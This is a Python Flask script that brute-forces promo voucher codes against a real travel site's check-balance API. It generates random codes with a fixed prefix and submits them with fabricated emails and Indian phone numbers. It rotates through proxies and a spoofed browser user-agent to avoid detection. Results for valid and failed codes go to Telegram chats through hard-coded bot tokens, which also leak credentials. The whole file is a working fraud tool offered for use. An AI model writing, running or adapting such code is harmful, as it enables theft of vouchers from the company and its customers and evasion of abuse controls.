from flask import Flask
import random
import aiohttp
import asyncio
import json
import os
import logging
import requests

# Setup logging
logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

# Load proxies from the file
PROXY_FILE = "proxies.txt"

def load_proxies():
    """Load proxies from the file and prepend http:// if missing."""
    if not os.path.exists(PROXY_FILE):
        logging.error("Proxy file not found.")
        return []
    with open(PROXY_FILE, "r") as f:
        return [f"http://{line.strip()}" for line in f if line.strip()]  # Add http:// prefix

PROXIES_LIST = load_proxies()

def get_random_proxy():
    """Select a random proxy from the list."""
    if PROXIES_LIST:
        proxy_url = random.choice(PROXIES_LIST)
        return {"http": proxy_url, "https": proxy_url}
    return None

def generate_code():
    """Generate a random code in the exact format Y2GTV?m?m?m?m?m?m?m?m?m?m."""
    base = "Y2GTV"
    suffix = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10))
    return base + suffix

def generate_email():
    """Generate a random email address."""
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    username = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10))
    return f"{username}@{random.choice(domains)}"

def generate_phone():
    """Generate a random 10-digit Indian phone number."""
    return f"9{random.randint(100000000, 999999999)}"

async def make_post_request_async(code, email, phone):
    """Make a POST request to the Yatra API asynchronously."""
    url = "https://secure.yatra.com/PaySwift/gift-voucher/yatra/dom2/1611240003969/check-balance"
    
    # Payload and headers
    payload = {
        "superPnr": "1611240003969",
        "emailId": email,
        "amount": 13191,
        "lob": "AIR",
        "isd": "91",
        "mobile": phone,
        "source": "YT",
        "context": "REVIEW",
        "vouchers": [{
            "code": code,
            "type": "PROMO",
            "pin": ""
        }]
    }
    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "content-type": "application/json",
        "user-agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36",
    }

    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(url, json=payload, headers=headers, timeout=5) as response:
                response.raise_for_status()  # Raise error for bad response
                return await response.json()
        except Exception as e:
            logging.error(f"Error during request: {e}")
            return None

def send_telegram_message(url):
    """Send a message to a Telegram chat via the bot using the provided URL."""
    try:
        response = requests.get(url)
        if response.status_code == 200:
            logging.info("Message sent successfully to Telegram.")
        else:
            logging.error(f"Failed to send message to Telegram. Status code: {response.status_code}")
    except requests.RequestException as e:
        logging.error(f"Error sending message to Telegram: {e}")

@app.route('/', methods=['GET'])
async def run_task():
    """Endpoint to trigger voucher validation."""
    code = generate_code()
    email = generate_email()
    phone = generate_phone()

    logging.info(f"Generated code: {code}")
    logging.info(f"Generated email: {email}")
    logging.info(f"Generated phone: {phone}")

    response = await make_post_request_async(code, email, phone)

    if response:
        res_code = response.get("resCode", -1)  # Get the resCode, default to -1 if not found
        
        if res_code == 1:  # Invalid code response
            logging.info(f"Invalid code response: {json.dumps(response, indent=2)}")
            # Send invalid code message to Telegram
            error_url = f"https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-1001660096246&text=Invalid%20Code:%20{code}%20Email:%20{email}%20Phone:%20{phone}%20Response:%20{json.dumps(response)}"
            send_telegram_message(error_url)
            return {"message": "Invalid promocode", "details": response}

        elif res_code == 0:  # Valid code response
            logging.info(f"Valid code response: {json.dumps(response, indent=2)}")
            # Send success message to Telegram
            success_url = f"https://api.telegram.org/bot5443217673:AAG2JGtn3gPGJ8UzKnTW2-l-p4tPt0A2NvQ/sendmessage?chat_id=-1001660096246&text=Success%20Code:%20{code}%20Email:%20{email}%20Phone:%20{phone}%20Response:%20{json.dumps(response)}"
            send_telegram_message(success_url)
            return {"message": "Successfully validated", "details": response}

        else:  # Unexpected response
            logging.error(f"Unexpected response: {json.dumps(response, indent=2)}")
            return {"error": "Unexpected response from API", "details": response}
    else:
        # Request failed, send failure message to Telegram
        error_url = f"https://api.telegram.org/bot5453678885:AAGAmj13cf0BrWUuvqNb4Nemc2zFR4IhpTw/sendmessage?chat_id=-871155395&text=Failed%20Code:%20{code}%20Email:%20{email}%20Phone:%20{phone}%20Error%20in%20API%20call"
        send_telegram_message(error_url)
        return {"error": "Request failed or no valid response received."}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Default to 5000 if no port is specified
    app.run(host="0.0.0.0", port=port, threaded=True)  # Enables threading to handle multiple requests concurrently
